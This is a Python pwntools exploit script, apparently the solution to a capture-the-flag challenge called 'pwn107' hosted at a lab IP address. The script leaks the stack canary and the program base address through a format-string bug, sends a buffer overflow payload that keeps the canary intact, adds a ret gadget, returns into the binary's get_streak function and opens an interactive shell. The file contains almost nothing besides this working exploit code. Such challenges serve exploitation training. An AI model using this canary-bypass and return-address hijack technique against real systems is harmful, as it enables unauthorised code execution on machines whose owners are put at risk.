from pwn import *
import binascii

context(arch="amd64", os="linux", endian="little")
elf = ELF("./pwn107")
rop = ROP(elf)

r = remote("10.10.20.40", 9007)
#r = process("./pwn107")

r.sendline(b"%13$p\n%10$p\n")
r.recvuntil(b"Your current streak: ")

log.info(f"Leaking informations...")

canary = int(r.recvline()[:-1], 16)
instruction_address = int(r.recvline()[:-1], 16) - 0xa90

log.success(f"Canary: 0x{canary:x}")
log.success(f"Instruction Base Address: 0x{instruction_address:x}")

get_streak = instruction_address + elf.sym["get_streak"]

payload =  b"\x00" * 0x18
payload += p64(canary)
payload += b"\x00" * 8
payload += p64(instruction_address + rop.find_gadget(["ret"])[0])
payload += p64(get_streak)

log.info(f"Sending Payload: {payload}")

r.send(payload)

log.success(f"Exploited - Returning a Shell")

r.interactive()






